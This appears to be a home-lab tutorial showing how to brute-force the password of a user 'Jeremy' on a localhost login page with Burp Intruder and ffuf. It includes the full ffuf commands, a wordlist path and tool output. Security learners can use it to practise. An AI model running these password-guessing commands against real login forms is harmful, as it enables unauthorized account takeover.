# Attacking Authentication - Brute Force

- We have a login form with the user account named "Jeremy".

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/cb006310-f3a7-4490-a15f-08002bf63320)


- We need brute-forcing to crack the password of a user named "Jeremy"
- For this let's intercept the request to the Burp suite.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/809df1c7-3f30-43f8-9acb-eadc92ea5337)


- After sending a request to the intruder we selected the payload password parameter by clicking on Add.
- Next step is to add a wordlist to start the brute-forcing the password on the user "Jeremy"

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/a55dbd36-74d2-45cc-af29-9a19d6fec711)

- On adding the wordlist as the payload of passwords we selected Start attack.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/b1a0b5f7-2903-4c29-97f1-b3668a9f1bd7)

- There is a page length difference in the result hope we have got our password successfully

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/a2eaf728-e979-4808-8487-b7c922322c49)

- On trying with username `jeremy` and password `letmein` we got successfully logged in.

## Alternate

- To make the process brute-forcing faster we will copy the intercepted request and copy it to a file in the local machine.
- Make a change in copied request by renaming the password parameter to "FUZZ" and saving it.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/1b0d0668-9795-4b3f-9766-1395eef0a1e6)

- Now, we use a tool named "FFUF" to make the brute-forcing process faster.
- Command: `ffuf -request req.txt -request-proto http -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-10000.txt`

```bash
└─$ ffuf -request req.txt -request-proto http -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-10000.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost/labs/a0x01.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-10000.txt
 :: Header           : Referer: http://localhost/labs/a0x01.php
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Sec-Fetch-User: ?1
 :: Header           : Host: localhost
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Origin: http://localhost
 :: Header           : Sec-Fetch-Dest: document
 :: Header           : Sec-Fetch-Mode: navigate
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Connection: close
 :: Header           : Cookie: PHPSESSID=bcbc6597490163fa9ed394d5f5145dcd
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Sec-Fetch-Site: same-origin
 :: Data             : username=jeremy&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 1808, Words: 494, Lines: 47, Duration: 20ms]
    * FUZZ: letmein

[Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 20ms]
    * FUZZ: qwerty

[Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 48ms]
    * FUZZ: password

[Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 47ms]
    * FUZZ: baseball

[Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 48ms]
    * FUZZ: superman

[Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 48ms]
    * FUZZ: zxcvbnm

[Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 48ms]
    * FUZZ: 12345
------------snip------------------
[Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 12ms]
    * FUZZ: 222333

[Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 13ms]
    * FUZZ: armani

[Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 11ms]
    * FUZZ: attack

[Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 11ms]
    * FUZZ: anhyeuem

[Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 12ms]
    * FUZZ: zenith

[Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 11ms]
    * FUZZ: thomas1

[WARN] Caught keyboard interrupt (Ctrl-C)
```

- It is making numerous requests per second we need to filter out the "size: 1814" for getting clean results.
- Command: `ffuf -request req.txt -request-proto http -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-10000.txt -fs 1814`

``` bash
└─$ ffuf -request req.txt -request-proto http -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-10000.txt -fs 1814

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost/labs/a0x01.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-10000.txt
 :: Header           : Sec-Fetch-User: ?1
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Connection: close
 :: Header           : Cookie: PHPSESSID=bcbc6597490163fa9ed394d5f5145dcd
 :: Header           : Sec-Fetch-Mode: navigate
 :: Header           : Sec-Fetch-Dest: document
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Origin: http://localhost
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Referer: http://localhost/labs/a0x01.php
 :: Header           : Sec-Fetch-Site: same-origin
 :: Header           : Host: localhost
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Data             : username=jeremy&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 1814
________________________________________________

[Status: 200, Size: 1808, Words: 494, Lines: 47, Duration: 4ms]
    * FUZZ: letmein

:: Progress: [10000/10000] :: Job [1/1] :: 3846 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```
- We successfully cracked the password "letmein".
